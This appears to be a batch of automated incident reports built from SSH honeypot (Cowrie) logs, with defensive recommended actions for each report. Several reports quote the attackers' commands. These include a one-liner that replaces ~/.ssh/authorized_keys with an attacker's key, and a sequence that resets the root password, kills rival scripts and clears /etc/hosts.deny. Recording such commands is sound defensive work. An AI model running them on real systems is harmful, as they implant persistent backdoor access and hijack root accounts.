### 🔴 HIGH · IR-bdfb569eaa60

| Field | Detail |
|---|---|
| **Source IP** | `190.181.27[.]37` |
| **First Seen** | 2026-07-03 17:02 |
| **Last Seen** | 2026-07-03 17:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 17:02:54` | `cowrie.session.connect` |
| `2026-07-03 17:02:54` | `cowrie.client.version` |
| `2026-07-03 17:02:54` | `cowrie.client.kex` |
| `2026-07-03 17:02:55` | `cowrie.login.success` |
| `2026-07-03 17:02:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.181.27[.]37` to AbuseIPDB if not already reported
- [ ] Block `190.181.27[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d511b478ceb

| Field | Detail |
|---|---|
| **Source IP** | `190.181.27[.]37` |
| **First Seen** | 2026-07-03 17:02 |
| **Last Seen** | 2026-07-03 17:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 17:02:55` | `cowrie.session.connect` |
| `2026-07-03 17:02:55` | `cowrie.client.version` |
| `2026-07-03 17:02:55` | `cowrie.client.kex` |
| `2026-07-03 17:02:56` | `cowrie.login.success` |
| `2026-07-03 17:02:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.181.27[.]37` to AbuseIPDB if not already reported
- [ ] Block `190.181.27[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be329842924d

| Field | Detail |
|---|---|
| **Source IP** | `64.225.17[.]153` |
| **First Seen** | 2026-07-03 17:03 |
| **Last Seen** | 2026-07-03 17:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 17:03:30` | `cowrie.session.connect` |
| `2026-07-03 17:03:30` | `cowrie.client.version` |
| `2026-07-03 17:03:30` | `cowrie.client.kex` |
| `2026-07-03 17:03:30` | `cowrie.login.success` |
| `2026-07-03 17:03:31` | `cowrie.session.params` |
| `2026-07-03 17:03:31` | `cowrie.command.input` |
| `2026-07-03 17:03:31` | `cowrie.command.failed` |
| `2026-07-03 17:03:31` | `cowrie.log.closed` |
| `2026-07-03 17:03:32` | `cowrie.session.params` |
| `2026-07-03 17:03:32` | `cowrie.command.input` |
| `2026-07-03 17:03:32` | `cowrie.session.file_download` |
| `2026-07-03 17:03:32` | `cowrie.log.closed` |
| `2026-07-03 17:03:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.225.17[.]153` to AbuseIPDB if not already reported
- [ ] Block `64.225.17[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89a5635ec063

| Field | Detail |
|---|---|
| **Source IP** | `64.225.17[.]153` |
| **First Seen** | 2026-07-03 17:03 |
| **Last Seen** | 2026-07-03 17:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 17:03:32` | `cowrie.session.connect` |
| `2026-07-03 17:03:32` | `cowrie.client.version` |
| `2026-07-03 17:03:32` | `cowrie.client.kex` |
| `2026-07-03 17:03:32` | `cowrie.login.success` |
| `2026-07-03 17:03:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.225.17[.]153` to AbuseIPDB if not already reported
- [ ] Block `64.225.17[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be9440fbe994

| Field | Detail |
|---|---|
| **Source IP** | `64.225.17[.]153` |
| **First Seen** | 2026-07-03 17:03 |
| **Last Seen** | 2026-07-03 17:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 17:03:32` | `cowrie.session.connect` |
| `2026-07-03 17:03:32` | `cowrie.client.version` |
| `2026-07-03 17:03:32` | `cowrie.client.kex` |
| `2026-07-03 17:03:32` | `cowrie.login.success` |
| `2026-07-03 17:03:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.225.17[.]153` to AbuseIPDB if not already reported
- [ ] Block `64.225.17[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0baae08e7a6f

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-03 17:06 |
| **Last Seen** | 2026-07-03 17:07 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 17:06:54` | `cowrie.session.connect` |
| `2026-07-03 17:06:55` | `cowrie.client.version` |
| `2026-07-03 17:06:55` | `cowrie.client.kex` |
| `2026-07-03 17:07:01` | `cowrie.login.success` |
| `2026-07-03 17:07:04` | `cowrie.session.params` |
| `2026-07-03 17:07:04` | `cowrie.command.input` |
| `2026-07-03 17:07:05` | `cowrie.log.closed` |
| `2026-07-03 17:07:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aae65d85f215

| Field | Detail |
|---|---|
| **Source IP** | `223.84.239[.]151` |
| **First Seen** | 2026-07-03 17:10 |
| **Last Seen** | 2026-07-03 17:11 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 17:10:40` | `cowrie.session.connect` |
| `2026-07-03 17:11:12` | `cowrie.client.version` |
| `2026-07-03 17:11:13` | `cowrie.client.kex` |
| `2026-07-03 17:11:14` | `cowrie.login.success` |
| `2026-07-03 17:11:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.84.239[.]151` to AbuseIPDB if not already reported
- [ ] Block `223.84.239[.]151` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a7602926e29

| Field | Detail |
|---|---|
| **Source IP** | `120.48.54[.]170` |
| **First Seen** | 2026-07-03 17:13 |
| **Last Seen** | 2026-07-03 17:14 |
| **Session Duration** | 61s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:5fpA1MG4YteU"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 17:13:14` | `cowrie.session.connect` |
| `2026-07-03 17:13:21` | `cowrie.client.version` |
| `2026-07-03 17:13:21` | `cowrie.client.kex` |
| `2026-07-03 17:13:23` | `cowrie.login.success` |
| `2026-07-03 17:13:24` | `cowrie.session.params` |
| `2026-07-03 17:13:24` | `cowrie.command.input` |
| `2026-07-03 17:13:24` | `cowrie.command.failed` |
| `2026-07-03 17:13:24` | `cowrie.log.closed` |
| `2026-07-03 17:13:25` | `cowrie.session.params` |
| `2026-07-03 17:13:25` | `cowrie.command.input` |
| `2026-07-03 17:13:26` | `cowrie.session.file_download` |
| `2026-07-03 17:13:26` | `cowrie.log.closed` |
| `2026-07-03 17:13:54` | `cowrie.session.params` |
| `2026-07-03 17:13:54` | `cowrie.command.input` |
| `2026-07-03 17:13:55` | `cowrie.log.closed` |
| `2026-07-03 17:13:56` | `cowrie.session.params` |
| `2026-07-03 17:13:56` | `cowrie.command.input` |
| `2026-07-03 17:13:56` | `cowrie.log.closed` |
| `2026-07-03 17:13:57` | `cowrie.session.params` |
| `2026-07-03 17:13:57` | `cowrie.command.input` |
| `2026-07-03 17:13:57` | `cowrie.session.file_download` |
| `2026-07-03 17:13:57` | `cowrie.log.closed` |
| `2026-07-03 17:13:58` | `cowrie.session.params` |
| `2026-07-03 17:13:58` | `cowrie.command.input` |
| `2026-07-03 17:13:59` | `cowrie.log.closed` |
| `2026-07-03 17:14:00` | `cowrie.session.params` |
| `2026-07-03 17:14:00` | `cowrie.command.input` |
| `2026-07-03 17:14:00` | `cowrie.log.closed` |
| `2026-07-03 17:14:01` | `cowrie.session.params` |
| `2026-07-03 17:14:01` | `cowrie.command.input` |
| `2026-07-03 17:14:01` | `cowrie.command.input` |
| `2026-07-03 17:14:02` | `cowrie.log.closed` |
| `2026-07-03 17:14:03` | `cowrie.session.params` |
| `2026-07-03 17:14:03` | `cowrie.command.input` |
| `2026-07-03 17:14:03` | `cowrie.log.closed` |
| `2026-07-03 17:14:04` | `cowrie.session.params` |
| `2026-07-03 17:14:04` | `cowrie.command.input` |
| `2026-07-03 17:14:05` | `cowrie.log.closed` |
| `2026-07-03 17:14:06` | `cowrie.session.params` |
| `2026-07-03 17:14:06` | `cowrie.command.input` |
| `2026-07-03 17:14:06` | `cowrie.log.closed` |
| `2026-07-03 17:14:07` | `cowrie.session.params` |
| `2026-07-03 17:14:07` | `cowrie.command.input` |
| `2026-07-03 17:14:08` | `cowrie.log.closed` |
| `2026-07-03 17:14:08` | `cowrie.session.params` |
| `2026-07-03 17:14:08` | `cowrie.command.input` |
| `2026-07-03 17:14:09` | `cowrie.log.closed` |
| `2026-07-03 17:14:10` | `cowrie.session.params` |
| `2026-07-03 17:14:10` | `cowrie.command.input` |
| `2026-07-03 17:14:10` | `cowrie.log.closed` |
| `2026-07-03 17:14:11` | `cowrie.session.params` |
| `2026-07-03 17:14:11` | `cowrie.command.input` |
| `2026-07-03 17:14:12` | `cowrie.log.closed` |
| `2026-07-03 17:14:13` | `cowrie.session.params` |
| `2026-07-03 17:14:13` | `cowrie.command.input` |
| `2026-07-03 17:14:13` | `cowrie.log.closed` |
| `2026-07-03 17:14:14` | `cowrie.session.params` |
| `2026-07-03 17:14:14` | `cowrie.command.input` |
| `2026-07-03 17:14:15` | `cowrie.log.closed` |
| `2026-07-03 17:14:16` | `cowrie.session.params` |
| `2026-07-03 17:14:16` | `cowrie.command.input` |
| `2026-07-03 17:14:16` | `cowrie.log.closed` |
| `2026-07-03 17:14:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.54[.]170` to AbuseIPDB if not already reported
- [ ] Block `120.48.54[.]170` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78a108c46d75

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-03 17:18 |
| **Last Seen** | 2026-07-03 17:18 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 17:18:11` | `cowrie.session.connect` |
| `2026-07-03 17:18:12` | `cowrie.client.version` |
| `2026-07-03 17:18:12` | `cowrie.client.kex` |
| `2026-07-03 17:18:18` | `cowrie.login.success` |
| `2026-07-03 17:18:21` | `cowrie.session.params` |
| `2026-07-03 17:18:21` | `cowrie.command.input` |
| `2026-07-03 17:18:22` | `cowrie.log.closed` |
| `2026-07-03 17:18:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af6c39d897cf

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]197` |
| **First Seen** | 2026-07-03 17:25 |
| **Last Seen** | 2026-07-03 17:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 17:25:28` | `cowrie.session.connect` |
| `2026-07-03 17:25:28` | `cowrie.client.version` |
| `2026-07-03 17:25:28` | `cowrie.client.kex` |
| `2026-07-03 17:25:28` | `cowrie.login.success` |
| `2026-07-03 17:25:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]197` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]197` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-413083367669

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-03 17:29 |
| **Last Seen** | 2026-07-03 17:29 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 17:29:22` | `cowrie.session.connect` |
| `2026-07-03 17:29:23` | `cowrie.client.version` |
| `2026-07-03 17:29:23` | `cowrie.client.kex` |
| `2026-07-03 17:29:29` | `cowrie.login.success` |
| `2026-07-03 17:29:32` | `cowrie.session.params` |
| `2026-07-03 17:29:32` | `cowrie.command.input` |
| `2026-07-03 17:29:35` | `cowrie.log.closed` |
| `2026-07-03 17:29:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-096ed1835617

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-03 17:31 |
| **Last Seen** | 2026-07-03 17:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 17:31:30` | `cowrie.session.connect` |
| `2026-07-03 17:31:30` | `cowrie.client.version` |
| `2026-07-03 17:31:30` | `cowrie.client.kex` |
| `2026-07-03 17:31:31` | `cowrie.login.success` |
| `2026-07-03 17:31:31` | `cowrie.session.params` |
| `2026-07-03 17:31:31` | `cowrie.command.input` |
| `2026-07-03 17:31:31` | `cowrie.log.closed` |
| `2026-07-03 17:31:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22d36c19f41f

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-03 17:40 |
| **Last Seen** | 2026-07-03 17:40 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 17:40:35` | `cowrie.session.connect` |
| `2026-07-03 17:40:36` | `cowrie.client.version` |
| `2026-07-03 17:40:36` | `cowrie.client.kex` |
| `2026-07-03 17:40:42` | `cowrie.login.success` |
| `2026-07-03 17:40:47` | `cowrie.session.params` |
| `2026-07-03 17:40:47` | `cowrie.command.input` |
| `2026-07-03 17:40:48` | `cowrie.log.closed` |
| `2026-07-03 17:40:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd7517ef1999

| Field | Detail |
|---|---|
| **Source IP** | `168.76.131[.]178` |
| **First Seen** | 2026-07-03 17:42 |
| **Last Seen** | 2026-07-03 17:42 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 17:42:14` | `cowrie.session.connect` |
| `2026-07-03 17:42:14` | `cowrie.client.version` |
| `2026-07-03 17:42:14` | `cowrie.client.kex` |
| `2026-07-03 17:42:15` | `cowrie.login.success` |
| `2026-07-03 17:42:16` | `cowrie.session.params` |
| `2026-07-03 17:42:16` | `cowrie.command.input` |
| `2026-07-03 17:42:16` | `cowrie.command.failed` |
| `2026-07-03 17:42:16` | `cowrie.log.closed` |
| `2026-07-03 17:42:17` | `cowrie.session.params` |
| `2026-07-03 17:42:17` | `cowrie.command.input` |
| `2026-07-03 17:42:17` | `cowrie.session.file_download` |
| `2026-07-03 17:42:17` | `cowrie.log.closed` |
| `2026-07-03 17:42:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.76.131[.]178` to AbuseIPDB if not already reported
- [ ] Block `168.76.131[.]178` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0fb770389b68

| Field | Detail |
|---|---|
| **Source IP** | `168.76.131[.]178` |
| **First Seen** | 2026-07-03 17:42 |
| **Last Seen** | 2026-07-03 17:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 17:42:18` | `cowrie.session.connect` |
| `2026-07-03 17:42:18` | `cowrie.client.version` |
| `2026-07-03 17:42:18` | `cowrie.client.kex` |
| `2026-07-03 17:42:19` | `cowrie.login.success` |
| `2026-07-03 17:42:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.76.131[.]178` to AbuseIPDB if not already reported
- [ ] Block `168.76.131[.]178` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5e27890cb50

| Field | Detail |
|---|---|
| **Source IP** | `168.76.131[.]178` |
| **First Seen** | 2026-07-03 17:42 |
| **Last Seen** | 2026-07-03 17:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 17:42:19` | `cowrie.session.connect` |
| `2026-07-03 17:42:19` | `cowrie.client.version` |
| `2026-07-03 17:42:20` | `cowrie.client.kex` |
| `2026-07-03 17:42:20` | `cowrie.login.success` |
| `2026-07-03 17:42:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.76.131[.]178` to AbuseIPDB if not already reported
- [ ] Block `168.76.131[.]178` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8079230d6f8

| Field | Detail |
|---|---|
| **Source IP** | `196.189.155[.]89` |
| **First Seen** | 2026-07-03 17:46 |
| **Last Seen** | 2026-07-03 17:46 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 17:46:38` | `cowrie.session.connect` |
| `2026-07-03 17:46:38` | `cowrie.client.version` |
| `2026-07-03 17:46:38` | `cowrie.client.kex` |
| `2026-07-03 17:46:39` | `cowrie.login.success` |
| `2026-07-03 17:46:40` | `cowrie.session.params` |
| `2026-07-03 17:46:40` | `cowrie.command.input` |
| `2026-07-03 17:46:40` | `cowrie.command.failed` |
| `2026-07-03 17:46:40` | `cowrie.log.closed` |
| `2026-07-03 17:46:41` | `cowrie.session.params` |
| `2026-07-03 17:46:41` | `cowrie.command.input` |
| `2026-07-03 17:46:41` | `cowrie.session.file_download` |
| `2026-07-03 17:46:41` | `cowrie.log.closed` |
| `2026-07-03 17:46:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.155[.]89` to AbuseIPDB if not already reported
- [ ] Block `196.189.155[.]89` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e7fba06c256

| Field | Detail |
|---|---|
| **Source IP** | `196.189.155[.]89` |
| **First Seen** | 2026-07-03 17:46 |
| **Last Seen** | 2026-07-03 17:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 17:46:41` | `cowrie.session.connect` |
| `2026-07-03 17:46:41` | `cowrie.client.version` |
| `2026-07-03 17:46:41` | `cowrie.client.kex` |
| `2026-07-03 17:46:42` | `cowrie.login.success` |
| `2026-07-03 17:46:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.155[.]89` to AbuseIPDB if not already reported
- [ ] Block `196.189.155[.]89` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2fb9c59b049

| Field | Detail |
|---|---|
| **Source IP** | `196.189.155[.]89` |
| **First Seen** | 2026-07-03 17:46 |
| **Last Seen** | 2026-07-03 17:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 17:46:42` | `cowrie.session.connect` |
| `2026-07-03 17:46:42` | `cowrie.client.version` |
| `2026-07-03 17:46:42` | `cowrie.client.kex` |
| `2026-07-03 17:46:43` | `cowrie.login.success` |
| `2026-07-03 17:46:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.155[.]89` to AbuseIPDB if not already reported
- [ ] Block `196.189.155[.]89` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd1643a4b20e

| Field | Detail |
|---|---|
| **Source IP** | `195.86.192[.]66` |
| **First Seen** | 2026-07-03 17:51 |
| **Last Seen** | 2026-07-03 17:51 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
